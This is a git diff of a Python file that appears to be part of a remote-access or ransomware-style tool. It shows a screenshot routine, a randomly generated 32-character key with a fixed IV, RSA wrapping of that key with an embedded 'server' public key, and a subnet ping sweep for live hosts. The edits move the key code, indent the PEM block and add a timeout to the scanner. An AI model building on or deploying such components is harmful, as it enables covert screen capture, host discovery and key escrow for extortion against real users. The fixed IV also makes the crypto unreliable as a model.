@@ -13,14 +13,6 @@ import socket
 from netaddr import IPNetwork
 import re
 
-IV = b"H" * 16
-
-enc_key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{['
-                                                                                                  ']}+~#-_.:,'
-                                                                                                  ';<>|\\') for i in
-                  range(0, 32))
-
-
 def list_to_path(lis: list):
     return ''.join(lis[i] + ' ' if len(lis) > 1 else lis[i] for i in range(len(lis)))
 
@@ -36,22 +28,32 @@ def screenshot() -> str:
     return save_path
 
 
+
+
+IV = b"H" * 16
+
+enc_key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{['
+                                                                                                  ']}+~#-_.:,'
+                                                                                                  ';<>|\\') for i in
+                  range(0, 32))
+
+
 def RSAFunc_server(message):
     # Server Side Encryption RSA of the key
     publicKey = """-----BEGIN PUBLIC KEY-----
-MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAo41dU8F/yw5NvgBvfvMB
-cW6kHxWG3lunMp0y/8D5oHOBzuXrB6DR5O0cK768NwQpueDJIzBUmMO7rwF+UHZG
-4h20R8v4WMDItIr9NLrNNMPhXDEIDo9A9NaMsa/PtHztsnlfJbm/sOffwScnKGrH
-5cmfzXu2AQA0vA8DUDdr3aJH5gRrPT6t+MNSBh3OskP5lfFa83kk9wwQp3RmDu+R
-Sc4x0/4TiBXxZ8o9SikgcYmICUvitd1WOu4TDCdDFBM/aEwWQ5YpG0Oc/isiUwyX
-bqJJQ+SScYw2b6jNkxzlw7/B2ZfG1sEubo0BoXHRqMTkzJyi76o8SCG/dWtMHaSg
-JXeSHwPxVcIppZ6D8jQt8r2tUaWydSa/xnVfSTZBHe/9PKEsu292tpwr4DD7E4ty
-33OmYWreNV8TZ9MK1npf2Lkwq/kqZO/wt3MqoUdd19hc83oYYD19B0PxtMkRmHIk
-EZANa986Fws/1Q9i6ZF1KzskZ+Bg9vwCLzUyUWtKd8a1Z97qR1ETOBv9PhuMwIlS
-C4KBCuFNnvwdiXthuCalodwKu1ZjOMsX5lFzNPfUVwGg7y4GKI/VKaugdpCAdkiV
-kYKEfXrZ30eC2eXR0HuSNT/wCTbzHAYqlgHO8lLoZNubSTyBMoDIqEWRuApjjTFG
-IYlvCv4afkIxMzzSAgBPHLkCAwEAAQ==
------END PUBLIC KEY-----"""
+    MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAo41dU8F/yw5NvgBvfvMB
+    cW6kHxWG3lunMp0y/8D5oHOBzuXrB6DR5O0cK768NwQpueDJIzBUmMO7rwF+UHZG
+    4h20R8v4WMDItIr9NLrNNMPhXDEIDo9A9NaMsa/PtHztsnlfJbm/sOffwScnKGrH
+    5cmfzXu2AQA0vA8DUDdr3aJH5gRrPT6t+MNSBh3OskP5lfFa83kk9wwQp3RmDu+R
+    Sc4x0/4TiBXxZ8o9SikgcYmICUvitd1WOu4TDCdDFBM/aEwWQ5YpG0Oc/isiUwyX
+    bqJJQ+SScYw2b6jNkxzlw7/B2ZfG1sEubo0BoXHRqMTkzJyi76o8SCG/dWtMHaSg
+    JXeSHwPxVcIppZ6D8jQt8r2tUaWydSa/xnVfSTZBHe/9PKEsu292tpwr4DD7E4ty
+    33OmYWreNV8TZ9MK1npf2Lkwq/kqZO/wt3MqoUdd19hc83oYYD19B0PxtMkRmHIk
+    EZANa986Fws/1Q9i6ZF1KzskZ+Bg9vwCLzUyUWtKd8a1Z97qR1ETOBv9PhuMwIlS
+    C4KBCuFNnvwdiXthuCalodwKu1ZjOMsX5lFzNPfUVwGg7y4GKI/VKaugdpCAdkiV
+    kYKEfXrZ30eC2eXR0HuSNT/wCTbzHAYqlgHO8lLoZNubSTyBMoDIqEWRuApjjTFG
+    IYlvCv4afkIxMzzSAgBPHLkCAwEAAQ==
+    -----END PUBLIC KEY-----"""
     publicKeyAfterImport = RSA.importKey(publicKey)
     encryptoMe = PKCS1_OAEP.new(publicKeyAfterImport)
     encryptedData = encryptoMe.encrypt(message)
@@ -156,9 +158,13 @@ def check_hosts(subnet_mask: str):
     return st
 
 
-def scanner(ip_addresses: list, lock: threading.Lock, clients: list):
+def scanner(ip_addresses: list, lock: threading.Lock, clients: list, start_time):
     for ip_address in ip_addresses:
         result = os.popen('ping {0} -n 2'.format(ip_address)).read()
+        print(time.time() - start_time)
+        if time.time() - start_time > 120:
+            break
+
         if "TTL" in result:
             with lock:
                 clients.append(ip_address)
